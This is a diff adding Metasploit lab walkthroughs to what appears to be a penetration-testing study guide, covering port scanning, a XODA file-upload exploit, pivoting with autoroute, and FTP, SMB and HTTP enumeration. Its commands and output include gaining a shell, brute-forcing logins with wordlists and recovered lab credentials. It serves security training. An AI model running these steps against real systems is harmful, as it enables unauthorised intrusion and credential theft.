@@ -262,7 +262,7 @@ show -h
 show all
 show exploits
 
-search <MODULE_DESCRIPTION/NAME>
+search <STRING>
 use <MODULE_NAME>
 set <OPTION>
 run
@@ -410,10 +410,13 @@ workspace -a Win2k12
 
 ```bash
 db_import /root/windows_server_2012
-    [*] Importing 'Nmap XML' data
-    [*] Import: Parsing with 'Nokogiri v1.10.7'
-    [*] Importing host 10.2.18.161
-    [*] Successfully imported /root/windows_server_2012
+```
+
+```bash
+[*] Importing 'Nmap XML' data
+[*] Import: Parsing with 'Nokogiri v1.10.7'
+[*] Importing host 10.2.18.161
+[*] Successfully imported /root/windows_server_2012
 ```
 
 ```bash
@@ -444,7 +447,417 @@ MSF **Auxiliary modules** are used during the information gathering (similar to 
 - enumerate services
 - discover hosts on different network subnets (post-exploitation phase)
 
+#### Lab Network Service Scanning
 
+> 🔬 Lab [T1046 : Network Service Scanning](https://attackdefense.com/challengedetails?cid=1869)
+
+```bash
+service postgresql start && msfconsole -q
+```
+
+```bash
+workspace -a Port_scan
+search portscan
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.41.167.3
+run
+```
+
+![](.gitbook/assets/image-20230412220747788.png)
+
+```bash
+curl 192.41.167.3
+```
+
+- Exploitation
+
+```bash
+search xoda
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS 192.41.167.3
+set TARGETURI /
+run
+```
+
+![](.gitbook/assets/image-20230412221111369.png)
+
+- Perform a network scan on the second target
+
+```bash
+meterpreter > shell
+```
+
+```bash
+/bin/bash -i
+ifconfig
+# 192.26.158.2 Local Lan subnet IP
+exit
+```
+
+- Add the route within `meterpreter` and background the meterpreter session
+
+```bash
+run autoroute -s 192.26.158.2
+background
+```
+
+![](.gitbook/assets/image-20230412221528898.png)
+
+```bash
+search portscan
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.26.158.3
+run
+```
+
+```bash
+# the port scan will be performed through the first target system using the route
+[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN
+[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN
+[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN
+```
+
+- Upload and run `nmap` against the second target, from the first target machine
+
+```bash
+sessions 1
+upload /root/tools/static-binaries/nmap /tmp/nmap
+shell
+```
+
+```bash
+/bin/bash -i
+cd /tmp
+chmod +x ./nmap
+./nmap -p- 192.26.158.3
+```
+
+```bash
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+```
+
+> 📌 There are **`3`** running services on the second target machine.
+
+#### UDP Scan
+
+- Into `msfconsole`
+
+```bash
+search udp_sweep
+use auxiliary/scanner/discovery/udp_sweep
+set RHOSTS 192.41.167.3
+run
+```
+
+### Service Enumeration
+
+> 📌🔬 Check the [Enumeration Section labs here](../assessment-methodologies/3-enumeration.md) for basic `nmap` enumeration.
+
+Next, there are some MSF commands and modules for **service enumeration** on the same labs from the Enumeration Section.
+
+- Auxiliary modules can be used for enumeration, brute-force attacks, etc
+
+On every attacker machine, run this command to start `msfconsole`:
+
+```bash
+service postgresql start && msfconsole -q
+```
+
+- Setup a **global variable**. This will set the RHOSTS option for all the modules utilized:
+
+```bash
+setg RHOSTS <TARGET_IP>
+```
+
+#### [FTP](../assessment-methodologies/3-enumeration/ftp-enum.md)
+
+> **`auxiliary/scanner/ftp/ftp_version`**
+
+```bash
+workspace -a FTP_ENUM
+search portscan
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.146.175.3
+run
+```
+
+```bash
+[+] 192.146.175.3: - 192.146.175.3:21 - TCP OPEN
+```
+
+```bash
+back
+search type:auxiliary name:ftp
+use auxiliary/scanner/ftp/ftp_version
+set RHOSTS 192.146.175.3
+run
+```
+
+```bash
+[+] 192.146.175.3:21 - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.146.175.3]\x0d\x0a'
+
+search ProFTPD
+```
+
+> **`auxiliary/scanner/ftp/ftp_login`**
+
+```bash
+back
+search type:auxiliary name:ftp
+use auxiliary/scanner/ftp/ftp_login
+show options
+set RHOSTS 192.146.175.3
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+```
+
+```bash
+[+] 192.146.175.3:21 - 192.146.175.3:21 - Login Successful: sysadmin:654321
+```
+
+> **`auxiliary/scanner/ftp/anonymous`**
+
+```bash
+back
+search type:auxiliary name:ftp
+use auxiliary/scanner/ftp/anonymous
+set RHOSTS 192.146.175.3
+run
+```
+
+#### [SMB/SAMBA](../assessment-methodologies/3-enumeration/smb-enum.md#lab-3)
+
+> **`auxiliary/scanner/smb/smb_version`**
+
+```bash
+setg RHOSTS 192.132.155.3
+workspace -a SMB_ENUM
+search type:auxiliary name:smb
+use auxiliary/scanner/smb/smb_version
+options
+run
+```
+
+```bash
+[*] 192.132.155.3:445 - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
+```
+
+> **`auxiliary/scanner/smb/smb_enumusers`**
+
+```bash
+back
+search type:auxiliary name:smb
+use auxiliary/scanner/smb/smb_enumusers
+info
+run
+```
+
+```bash
+[+] 192.132.155.3:139 - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
+```
+
+> **`auxiliary/scanner/smb/smb_enumshares`**
+
+```bash
+back
+search type:auxiliary name:smb
+use auxiliary/scanner/smb/smb_enumshares
+set ShowFiles true
+run
+```
+
+```bash
+[+] 192.132.155.3:139 - public - (DS) 
+[+] 192.132.155.3:139 - john - (DS) 
+[+] 192.132.155.3:139 - aisha - (DS) 
+[+] 192.132.155.3:139 - emma - (DS) 
+[+] 192.132.155.3:139 - everyone - (DS) 
+[+] 192.132.155.3:139 - IPC$ - (I) IPC Service (samba.recon.lab)
+```
+
+> **`auxiliary/scanner/smb/smb_login`**
+
+```bash
+back
+search smb_login
+use auxiliary/scanner/smb/smb_login
+options
+set SMBUser admin
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+```
+
+```bash
+[+] 192.132.155.3:445 - 192.132.155.3:445 - Success: '.\admin:password'
+```
+
+#### [HTTP](../assessment-methodologies/3-enumeration/http-enum.md#lab-3)
+
+> 🔬 [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)
+
+- Remember to specify the correct port and if targeting a web server with SSL enabled, in the options.
+
+```bash
+setg RHOSTS 192.106.226.3
+setg RHOST 192.106.226.3
+workspace -a HTTP_ENUM
+```
+
+> **`auxiliary/scanner/http/apache_userdir_enum`**
+
+```bash
+search apache_userdir_enum
+use auxiliary/scanner/http/apache_userdir_enum
+options
+info
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+```
+
+```bash
+[+] http://192.106.226.3/ - Users found: rooty
+```
+
+> **`auxiliary/scanner/http/brute_dirs`**
+
+> **`auxiliary/scanner/http/dir_scanner`**
+
+```bash
+search dir_scanner
+use auxiliary/scanner/http/dir_scanner
+options
+run
+```
+
+> **`auxiliary/scanner/http/dir_listing`**
+
+> **`auxiliary/scanner/http/http_put`**
+
+```bash
+[+] Found http://192.106.226.3:80/cgi-bin/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/data/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/doc/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/downloads/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/icons/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/manual/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/secure/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/users/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/uploads/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/web_app/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/view/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/webadmin/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/webmail/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/webdb/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/webdav/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/~admin/ 404 (192.106.226.3)
+[+] Found http://192.106.226.3:80/~nobody/ 404 (192.106.226.3)
+```
+
+> **`auxiliary/scanner/http/files_dir`**
+
+```bash
+search files_dir
+use auxiliary/scanner/http/files_dir
+options
+set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_files.txt
+run
+```
+
+```bash
+[+] Found http://192.106.226.3:80/file.backup 200
+[*] Using code '404' as not found for files with extension .bak
+[*] Using code '404' as not found for files with extension .c
+[+] Found http://192.106.226.3:80/code.c 200
+[*] Using code '404' as not found for files with extension .cfg
+[+] Found http://192.106.226.3:80/code.cfg 200
+[*] Using code '404' as not found for files with extension .class
+[...]
+[*] Using code '404' as not found for files with extension .html
+[+] Found http://192.106.226.3:80/index.html 200
+[*] Using code '404' as not found for files with extension .htm
+[...]
+[+] Found http://192.106.226.3:80/test.php 200
+[*] Using code '404' as not found for files with extension .tar
+[...]
+```
+
+> **`auxiliary/scanner/http/http_login`**
+
+```bash
+search http_login
+use auxiliary/scanner/http/http_login
+options
+set AUTH_URI /secure/
+unset USERPASS_FILE
+echo "rooty" > user.txt
+set USER_FILE /root/user.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+```
+
+> **`auxiliary/scanner/http/http_header`**
+
+```bash
+search http_header
+use auxiliary/scanner/http/http_header
+options
+run
+```
+
+```bash
+[+] 192.106.226.3:80 : CONTENT-TYPE: text/html
+[+] 192.106.226.3:80 : LAST-MODIFIED: Wed, 27 Feb 2019 04:21:01 GMT
+[+] 192.106.226.3:80 : SERVER: Apache/2.4.18 (Ubuntu)
+[+] 192.106.226.3:80 : detected 3 headers
+```
+
+> **`auxiliary/scanner/http/http_version`**
+
+```bash
+search type:auxiliary name:http
+use auxiliary/scanner/http/http_version
+options
+run
+# in case of HTTPS website, set RPORT=443 and SSL="true"
+```
+
+```bash
+[+] 192.106.226.3:80 Apache/2.4.18 (Ubuntu)
+```
+
+> **`auxiliary/scanner/http/robots_txt`**
+
+```bash
+search robots_txt
+use auxiliary/scanner/http/robots_txt
+options
+run
+```
+
+```bash
+[+] Contents of Robots.txt:
+# robots.txt for attackdefense 
+User-agent: test                     
+# Directories
+Allow: /webmail
+User-agent: *
+# Directories
+Disallow: /data
+Disallow: /secure
+```
+
+```bash
+curl http://192.106.226.3/data/
+curl http://192.106.226.3/secure/
+```
+
+#### [MYSQL](../assessment-methodologies/3-enumeration/mysql-enum.md)
+
+> 🔬 [Metasploit - MySQL Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=120)
 
 ## Vulnerability Scanning With MSF
 
